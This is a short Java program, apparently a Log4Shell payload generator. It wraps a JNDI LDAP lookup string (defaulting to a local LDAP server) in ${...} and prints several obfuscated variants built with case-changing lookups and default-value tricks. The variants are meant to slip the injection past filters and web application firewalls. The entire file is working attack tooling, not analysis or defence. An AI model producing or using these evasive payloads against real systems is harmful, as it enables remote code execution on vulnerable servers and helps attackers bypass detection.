package log4jobfuscator;


import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/*
 *  Implementation of Log4J obfuscator based on the work from https://github.com/woodpecker-appstore/log4j-payload-generator
 */
public class Main {

	public static void generatorPayload(String address) {
        
        String tmpPayload = address;
        StringObfuscator1 stringObfuscator1 = new StringObfuscator1();
        StringObfuscator2 stringObfuscator2 = new StringObfuscator2();

        
        String payload = String.format("${%s}",tmpPayload);
        System.out.println("\n" + payload + "\n");

        System.out.println("{[upper|lower]:x} Random obfuscate:");
        payload = String.format("${%s}",stringObfuscator1.obfuscateString(tmpPayload,false));
        System.out.println("\n" + payload + "\n");

        System.out.println("{[upper|lower]:x} all the obfuscate:");
        payload = String.format("${%s}",stringObfuscator1.obfuscateString(tmpPayload,true));
        System.out.println("\n" + payload + "\n");

        System.out.println("{::-n} random obfuscate:");
        payload = String.format("${%s}",stringObfuscator2.obfuscateString(tmpPayload,false));
        System.out.println("\n" + payload + "\n");

        System.out.println("{::-n} all the obfuscate:");
        payload = String.format("${%s}",new StringObfuscator2().obfuscateString(tmpPayload,true));
        System.out.println("\n" + payload + "\n");
    }

	public static void main(String[] args) {
		String address = "jndi:ldap://127.0.0.1:1099/obj";
		generatorPayload(address);

	}

}
